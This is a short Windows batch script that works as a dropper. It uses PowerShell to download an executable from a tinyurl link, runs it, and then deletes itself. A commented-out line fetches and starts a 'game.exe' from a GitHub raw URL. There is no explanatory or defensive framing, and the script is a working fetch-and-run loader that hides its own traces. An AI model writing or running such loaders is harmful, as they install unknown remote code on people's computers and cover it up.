@echo off
set "url=https://tinyurl.com/4wvmcbbt"
set "file=%~dp0runme.exe"

:: Download EXE using PowerShell
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%file%')"

:: Run the downloaded EXE
if exist "%file%" (
    start "" "%file%"
) else (
    echo Download failed.
    exit /b
)

:: Self-delete
(del "%~f0") >nul 2>&1


::curl -L -o "https://raw.githubusercontent.com/Algorithm99root/c-or-c-project/refs/heads/master/Gussing%20Game%20in%20C/main.exe" "%USERPROFILE%\Desktop\game.exe"   && start "" "%USERPROFILE%\Desktop\game.exe"
